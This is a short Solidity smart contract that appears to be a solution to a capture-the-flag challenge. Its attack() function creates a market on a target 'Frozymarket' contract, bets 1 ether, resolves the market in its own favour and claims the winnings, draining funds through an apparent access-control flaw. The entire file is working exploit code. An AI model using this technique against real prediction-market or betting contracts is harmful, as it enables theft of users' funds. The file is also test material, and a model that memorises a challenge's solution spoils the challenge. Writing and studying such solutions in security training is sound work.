// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Challenge.sol";

contract Attacker
{
    Frozymarket target;

    constructor(address _target)
    {
        target = Frozymarket(_target);
    }

    function attack() external payable
    {
        require (msg.value == 1 ether, "Please send more");
        // Implement your Attack here

        //Create new market
        target.createMarket("Will I steal all your money?", 0);

        //Place bets on the new market
        target.bet{value: 1 ether}(1, true);

        //Resolve the market
        target.resolveMarket(1, true);

        //Withdraw the funds
        target.claimWinnings(1);
    }

    receive() external payable {}
}
